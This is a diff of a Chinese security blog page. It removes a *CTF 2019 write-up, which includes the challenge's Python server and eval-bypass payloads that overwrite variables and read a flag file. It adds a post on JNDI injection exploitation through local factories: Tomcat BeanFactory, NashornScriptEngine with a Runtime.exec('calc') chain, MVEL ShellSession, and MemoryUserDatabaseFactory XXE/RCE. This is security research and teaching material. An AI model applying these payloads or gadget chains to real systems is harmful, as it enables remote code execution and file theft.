@@ -16,7 +16,7 @@
   <meta name="description" content="摸鱼">
   <meta name="author" content="Aluvion">
   <meta name="keywords" content="">
-  <title>Python黑魔法-[]绕过空格实现变量覆盖 - Twings</title>
+  <title>SpringBoot框架下的JNDI利用法探索 - Twings</title>
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
 <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
@@ -117,7 +117,7 @@
               
                 <p class="mt-3 post-meta">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-                  星期四, 五月 2日 2019, 9:07 晚上
+                  星期四, 三月 3日 2022, 10:04 晚上
                 </p>
               
 
@@ -126,7 +126,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    1.3k 字
+                    1.2k 字
                   </span>
                 
 
@@ -169,164 +169,196 @@
           <div class="post-content mx-auto" id="post">
             
             <div class="markdown-body">
-              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>上个周末做的 *CTF，不得不说是个好比赛，菜鸡 Web 手学到了很多新的知识，后来因为要给国赛半决赛出题的原因，所以放了几天没有时间去总结，现在题目差不多完结了，就摸个鱼总结一下，就从有趣的 Misc 题目开始吧。</p>
-<p>官方 writeup：<a href="https://github.com/sixstars/starctf2019" target="_blank" rel="noopener">https://github.com/sixstars/starctf2019</a></p>
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> JNDI注入在高版本下显得比较鸡肋，不过基于本地Factory的利用方式还是值得学习的。</p>
 <a id="more"></a>
 <hr>
-<p>题目 socket 服务器就一个文件，代码如下：</p>
-<pre><code class="python">#!/usr/bin/python
-# -*- encoding: utf-8 -*-
-# written in python 2.7
-__author__ = &#39;garzon&#39;
-
-import sys
-import hashlib
-import random
-
-
-# private ------------------------------------------------------------
-def flag():
-    # flag of stage 1
-    return &#39;*ctf{[0-9a-zA-Z_[\]]+}&#39;
-
-
-def flag2():
-    ret = &#39;&#39;
-    # flag of stage 2
-    # ret = open(&#39;flag&#39;, &#39;rb&#39;).read() # No more flag for you hackers in stage2!
-    return ret
-
-
-def switch_safe_mode_factory():
-    ctx = {&#39;io_pair&#39;: [None, None]}
-
-    def __wrapper(): (ctx[&#39;io_pair&#39;], (sys.stdin, sys.stderr)) = ([sys.stdin, sys.stderr], ctx[&#39;io_pair&#39;])
-
-    return __wrapper
-
-
-def PoW():
-    return
-    while True:
-        a = (&#39;&#39;.join([chr(random.randint(0, 0xff)) for _ in xrange(2)])).encode(&#39;hex&#39;)
-        print &#39;hashlib.sha1(input).hexdigest() == &quot;%s&quot;&#39; % a
-        print &#39;&gt;&#39;,
-        input = raw_input()
-        if hashlib.sha1(input).hexdigest()[:4] == a:
-            break
-        print &#39;invalid PoW, please retry&#39;
-
-
-# protected ----------------------------------------------------------
-def fib(a):
-    if a &lt;= 1: return 1
-    return fib(a - 1) + fib(a - 2)
-
-
-# public -------------------------------------------------------------
-def load_flag_handler(args):
-    global session
-    session[&#39;log&#39;] = flag2()
-    return &#39;done&#39;
-
-
-def ping_handler(args):
-    return &#39;pong&#39;
-
-
-def fib_handler(args):
-    a = int(args[0])
-    if a &gt; 5 or a &lt; 0: return &#39;out of range&#39;
-    return str(fib(a))
-
-
-if __name__ == &#39;__main__&#39;:
-    session = {&#39;log&#39;: flag()}
-    switch_safe_mode = switch_safe_mode_factory()
-    switch_safe_mode_factory = None
-    valid_event_chars = set(&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789[]&#39;)
-
-    while True:
-        PoW()
-        print &#39;$&#39;,
-        event = raw_input()
-        # get eventName and args from the RPC requests,
-        # like: funcName114514arg1114514args2114514arg3 ...
-        switch_safe_mode()
-        if event == &#39;exit&#39;: break
-
-        for c in event:
-            if c not in valid_event_chars:
-                print &quot;invalid request&quot;
-                exit(-1)
-
-        event, args = event.split(&#39;114514&#39;)
-        args = args.split(&#39;114514&#39;)
-
-        try:
-            handler = eval(event)
-            print handler(args)
-        # except Exception, e:
-        # print &#39;exception:&#39;, str(e)
-        except:
-            print &#39;exception&#39;
+<h3 id="Tomcat-BeanFactory"><a href="#Tomcat-BeanFactory" class="headerlink" title="Tomcat-BeanFactory"></a>Tomcat-BeanFactory</h3><p>比较出名的可利用Factory，而且Tomcat使用范围比较广。</p>
+<p>该类中的getObjectInstance函数可以调用一个对象的函数，要求满足三个条件。</p>
+<ul>
+<li>要有public的无参构造函数：</li>
+</ul>
+<pre><code class="java">Object bean = beanClass.getConstructor().newInstance();
 </code></pre>
-<p>这套代码是两个题目一起用的，其中 flag1 只需要打印 session 变量，而 flag2 则需要 RCE 或者文件读取。</p>
-<p>简单审计一下代码，可以看到逻辑是这样的：</p>
 <ul>
-<li>sha1 验证码</li>
-<li>将标准输入和错误输出放入一个变量中，然后置为 None，在恢复之前我们无法进行下一次输入</li>
-<li>将我们输入的字符串按照 114514 进行分割</li>
-<li>将 eval 第一部分得到一个函数，再将第二部分作为参数进行调用</li>
+<li>要调用的函数为public：</li>
 </ul>
-<p>看起来功能很强大，其实有几个限制：</p>
-<ul>
-<li>有非法字符检测，所以我们只能输入数字、大小写字母、下划线和中括号</li>
-<li>参数类型为 list</li>
-</ul>
-<p>没有空格，没有等号，没有小括号，分割来的参数也只是元素为字符串的 list 而不是变量，似乎无从下手了啊。</p>
-<p>但是 eval 的功能是无比强大的，虽然我们无法直接使用 eval 来进行输出，但是这里可以引入变量，而且还有中括号，是不是有什么 Python 黑魔法呢？只要我们可以在 eval 中覆盖掉 args，然后返回一个输出函数，这样我们就能拿到 flag1 了。</p>
-<p>那自然是有的，首先是变量覆盖：</p>
-<pre><code class="python">&gt;&gt;&gt; a = 0
-&gt;&gt;&gt; for a in [1]:
-...     pass
+<pre><code class="java">Method method = forced.get(propName);
 ...
-&gt;&gt;&gt; a
-1
-&gt;&gt;&gt;
+method.invoke(bean, valueArray);
 </code></pre>
-<p>虽然没有等号，但是我们可以使用 for 来进行变量覆盖，那怎么绕过空格呢？答案是使用 Python 的特色写法—— list 生成器和中括号：</p>
-<pre><code class="python">&gt;&gt;&gt; a = 0
-&gt;&gt;&gt; [[str][0]for[a]in[[1]]]
-[&lt;type &#39;str&#39;&gt;]
-&gt;&gt;&gt; a
-1
+<ul>
+<li>要调用的函数有且只有一个String类型的参数</li>
+</ul>
+<pre><code class="java">Class&lt;?&gt; paramTypes[] = new Class[1];
+paramTypes[0] = String.class;
+...
+forced.put(param, beanClass.getMethod(setterName, paramTypes));
 </code></pre>
-<p>这行代码的意思是遍历 [1] 这个 list ，赋值给 a，然后再返回一个 str，因为没有执行的原因，所以返回的是一个函数：</p>
-<pre><code class="python">&gt;&gt;&gt; [[str][0]for[a,b]in[[1,2],[&#39;a&#39;,&#39;b&#39;]]]
-[&lt;type &#39;str&#39;&gt;, &lt;type &#39;str&#39;&gt;]
+<ul>
+<li>其实还有一些隐含的条件，比如它的bean在通过无参构造函数实例化后，到调用该函数之间没有其他操作，也就是说可控输入就只剩下参数了（或许可以通过多次调用提前控制一些成员）。又比如它无法进行链式调用，所以反射链难以实现，要找到利用方式基本只有那种输入命令-&gt;执行，或者ClassLoader的奇妙玩法了。</li>
+</ul>
+<h4 id="存在漏洞或危险操作的依赖"><a href="#存在漏洞或危险操作的依赖" class="headerlink" title="存在漏洞或危险操作的依赖"></a>存在漏洞或危险操作的依赖</h4><p>通过ELProcessor、GroovyShell、Yaml、MVEL、Xstream、bsh等存在漏洞的工具的玩法。</p>
+<h4 id="Mlet"><a href="#Mlet" class="headerlink" title="Mlet"></a>Mlet</h4><p>MLet是一个ClassLoader，继承自URLClassLoader，其public函数addURL可以通过一个字符串URL定义远程资源：</p>
+<pre><code class="java">public void addURL(String url) throws ServiceNotFoundException {
+    try {
+        URL ur = new URL(url);
+        if (!Arrays.asList(getURLs()).contains(ur))
+            super.addURL(ur);
+    } catch (MalformedURLException e) {
+       ...
+    }
+}
 </code></pre>
-<p>因为遍历了两次的原因，所以返回的 list 中有两个 str，为了绕过函数和 for 之间的空格，这里使用了 list 的写法：</p>
-<pre><code class="python">&gt;&gt;&gt; [input][0]
-&lt;built-in function input&gt;
+<p>远程类需要加载并初始化才能执行其中的静态代码块，问题在于我们通过BeanFactory实例化并调用的Mlet是一个与环境隔离的ClassLoader，我们无法通过这里之外的加载/实例化点完成利用，因为环境中使用的ClassLoader不是这个Mlet。</p>
+<p>而在Mlet类中，可以调用的loadClass函数来自父类的父类ClassLoader，而loadClass在加载失败时会调用findClass从资源中定义类：</p>
+<pre><code class="java">public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException {
+    return loadClass(name, false);
+}
+
+
+protected Class&lt;?&gt; loadClass(String name, boolean resolve)
+    throws ClassNotFoundException
+{
+    synchronized (getClassLoadingLock(name)) {
+        // First, check if the class has already been loaded
+        Class&lt;?&gt; c = findLoadedClass(name);
+        if (c == null) {
+            long t0 = System.nanoTime();
+            try {
+                if (parent != null) {
+                    c = parent.loadClass(name, false);
+                } else {
+                    c = findBootstrapClassOrNull(name);
+                }
+            } 
+            ...
+
+                if (c == null) {
+                    // If still not found, then invoke findClass in order
+                    // to find the class.
+                    long t1 = System.nanoTime();
+                    c = findClass(name);
+
+                    ...
+                }
+        }
+        ...
+    }
+}
+
+// Mlet
+protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException {
+    return findClass(name, currentClr);
+}
+
+Class&lt;?&gt; findClass(String name, ClassLoaderRepository clr)
+    throws ClassNotFoundException {
+    Class&lt;?&gt; c = null;
+    MLET_LOGGER.logp(Level.FINER, MLet.class.getName(), &quot;findClass&quot;, name);
+    // Try looking in the JAR:
+    try {
+        c = super.findClass(name);
+        ...
+    }
+}
+
+// URLClassLoader
+protected Class&lt;?&gt; findClass(final String name)
+    throws ClassNotFoundException
+{
+    final Class&lt;?&gt; result;
+    try {
+        result = AccessController.doPrivileged(
+            new PrivilegedExceptionAction&lt;Class&lt;?&gt;&gt;() {
+                public Class&lt;?&gt; run() throws ClassNotFoundException {
+                    String path = name.replace(&#39;.&#39;, &#39;/&#39;).concat(&quot;.class&quot;);
+                    Resource res = ucp.getResource(path, false);
+                    if (res != null) {
+                        try {
+                            return defineClass(name, res);
+                        } 
+                        ...
+                    } else {
+                        return null;
+                    }
+                }
+            }, acc);
+    } 
+    ...
+}
 </code></pre>
-<p>这样一来我们就可以进行变量覆盖了，所以 payload 为：</p>
-<pre><code class="python">[[input][0]for[args]in[[session]]][0]114514x
+<p>然而loadClass的第二个参数固定为false，也就是说仅仅是加载也无法执行静态代码块，必须要走到实例化的步骤才行。而ClassLoader中自然是不会有实例化类的操作的，所以这种方式也就走不通了。</p>
+<h4 id="NashornScriptEngineFactory"><a href="#NashornScriptEngineFactory" class="headerlink" title="NashornScriptEngineFactory"></a>NashornScriptEngineFactory</h4><p>有无参构造函数：</p>
+<pre><code class="java">public NashornScriptEngineFactory() {
+}
 </code></pre>
-<p>或者使用 str 函数也是可以的。</p>
-<p>那第二题也很简单了，首先我们只要在将 PoW 覆盖为 switch_safe_mode（或者调用 reload 重载 sys），就可以绕过标准输入被替换掉了的问题，可以进行第二轮的输入。</p>
-<p>那么要怎么读取 flag 文件呢？我们是不是可以绕开黑名单？</p>
-<p>有了变量覆盖，我们能做到的事情大大增加了。观察代码可以发现，我们可以将 raw_input 覆盖为 input 函数（input = eval(raw_input)），这样我们就可以在黑名单过滤之前进行代码执行了。</p>
-<p>payload：</p>
-<pre><code class="python">[[str]for[PoW]in[[switch_safe_mode]]for[raw_input]in[[input]]][0][0]114514
-[&#39;[[str]for[args]in[[session]]][0][0]114514&#39; for session in [open(&#39;flag&#39;,&#39;rb&#39;).read()]][0]
+<p>有危险函数：</p>
+<pre><code class="java">public ScriptEngine getScriptEngine(String... args) {
+    return this.newEngine((String[])Objects.requireNonNull(args), getAppClassLoader(), (ClassFilter)null);
+}
 </code></pre>
-<p>第一句很好理解，因为嵌套了两次 for 所以是两层结构的 list，第二句在 input 中经过 eval 之后，会将 session 覆盖为 flag，然后返回一个字符：</p>
-<pre><code class="python">[[str]for[args]in[[session]]][0][0]114514
+<p>可以链式利用：</p>
+<pre><code class="java">new NashornScriptEngineFactory().getScriptEngine(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&#39;calc&#39;)&quot;);
 </code></pre>
-<p>就回到了第一题的情况了。</p>
+<p>然而BeanFactory似乎实现不了链式调用，寄。</p>
+<h4 id="Mvel"><a href="#Mvel" class="headerlink" title="Mvel"></a>Mvel</h4><p>一种表达式，需要依赖：</p>
+<pre><code class="xml">&lt;!-- https://mvnrepository.com/artifact/org.mvel/mvel2 --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.mvel&lt;/groupId&gt;
+    &lt;artifactId&gt;mvel2&lt;/artifactId&gt;
+    &lt;version&gt;2.4.14.Final&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>MVEL类没有无参构造函数，但是有很多静态public函数，比如eval、evalToString和evalToBoolean，可以在mvel2包里面其他public类中找一找有没有调用这些静态函数的地方。</p>
+<p>单纯用文本搜索做起来会比较麻烦，因为调用了eval的地方实在有点多，看起来很麻烦，如果用codeQL等工具污点分析就会方便很多，详见参考文章。</p>
+<p>ShellSession类有一个无参构造函数：</p>
+<pre><code class="java">public ShellSession() {
+    ...
+}
+</code></pre>
+<p>其exec函数只有一个String类型参数：</p>
+<pre><code class="java">public void exec(String command) {
+    for (String c : command.split(&quot;\n&quot;)) {
+        inBuffer.append(c);
+        _exec();
+    }
+}
+</code></pre>
+<p>其_exec函数会调用内部定义好的Command们的execute函数：</p>
+<pre><code class="java">try {
+    commands.get(inTokens[0]).execute(this, passParameters);
+}
+</code></pre>
+<p>PushContext的execute函数中会调用MVEL类的eval函数：</p>
+<pre><code class="java">public Object execute(ShellSession session, String[] args) {
+    session.setCtxObject(MVEL.eval(args[0], session.getCtxObject(), session.getVariables()));
+    return &quot;Changed Context&quot;;
+}
+</code></pre>
+<h3 id="MemoryUserDatabaseFactory"><a href="#MemoryUserDatabaseFactory" class="headerlink" title="MemoryUserDatabaseFactory"></a>MemoryUserDatabaseFactory</h3><p>继承了ObjectFactory接口，其getObjectInstance函数中会实例化一个MemoryUserDatabase对象，该对象可以设置几个属性：</p>
+<pre><code class="java">MemoryUserDatabase database = new MemoryUserDatabase(name.toString());
+RefAddr ra = null;
+
+ra = ref.get(&quot;pathname&quot;);
+if (ra != null) {
+    database.setPathname(ra.getContent().toString());
+}
+
+ra = ref.get(&quot;readonly&quot;);
+if (ra != null) {
+    database.setReadonly(Boolean.parseBoolean(ra.getContent().toString()));
+}
+
+ra = ref.get(&quot;watchSource&quot;);
+if (ra != null) {
+    database.setWatchSource(Boolean.parseBoolean(ra.getContent().toString()));
+}
+</code></pre>
+<p>然后调用其open和save函数，分别可以触发xxe和tomcat下的rce漏洞。</p>
+<h3 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h3><p>详见参考文章。</p>
 <hr>
-<p>Orz</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/t/10829" target="_blank" rel="noopener">https://xz.aliyun.com/t/10829</a></p>
+<p><a href="https://tttang.com/archive/1405/" target="_blank" rel="noopener">https://tttang.com/archive/1405/</a></p>
 
             </div>
             <hr>
@@ -339,8 +371,6 @@ if __name__ == &#39;__main__&#39;:
                     
                       <a class="hover-with-bg" href="/tags/Web/">Web</a>
                     
-                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
-                    
                   </span>
                 
               </p>
@@ -351,16 +381,11 @@ if __name__ == &#39;__main__&#39;:
                 <div class="post-prevnext row">
                   <div class="post-prev col-12 col-md-6">
                     
-                      <a href="/2019/05/05/CTF2019-996game复现-nodejs-mongodb使用/">
-                        <i class="fa fa-chevron-left"></i>
-                        <span>*CTF2019-996game复现/nodejs+mongodb使用</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-12 col-md-6">
                     
-                      <a href="/2019/04/25/Java特色-表达式注入漏洞从入门到放弃/">
-                        <span>Java特色-表达式注入漏洞从入门到放弃</span>
+                      <a href="/2022/02/27/Java反序列化中的RMI、JRMP、JNDI、LDAP-2/">
+                        <span>Java反序列化中的RMI、JRMP、JNDI、LDAP(2)</span>
                         <i class="fa fa-chevron-right"></i>
                       </a>
                     
@@ -533,7 +558,7 @@ if __name__ == &#39;__main__&#39;:
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "Python黑魔法-[]绕过空格实现变量覆盖&nbsp;",
+        "SpringBoot框架下的JNDI利用法探索&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
